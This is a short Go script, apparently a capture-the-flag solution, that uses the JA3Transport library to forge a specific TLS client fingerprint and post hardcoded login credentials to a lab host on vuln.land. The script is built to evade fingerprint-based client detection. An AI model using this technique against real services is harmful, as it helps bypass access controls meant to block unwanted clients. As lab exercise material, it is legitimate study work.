package main

import "fmt"
import "net/http"
import "net/url"
import "github.com/cucyber/JA3Transport"

import "io/ioutil"

func main() {
	// Create an http.Transport object which can be used as a parameter for http.Client
	tr, _ := ja3transport.NewTransport("771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0")
	// Set the .Transport member of any http.Client 
	client := &http.Client{Transport: tr}
	// Make request to website using the new client
	resp, _ := client.PostForm("https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land/login", url.Values{"username": {"santa1337"}, "password": {"ladida"}, "submit": {"Login"}})

	if resp.StatusCode == http.StatusOK {
		bodyBytes, _ := ioutil.ReadAll(resp.Body)
		bodyString := string(bodyBytes)
		fmt.Println(bodyString)
	} else {
		fmt.Println("\nresp: ")
		fmt.Println(resp)
	}
}
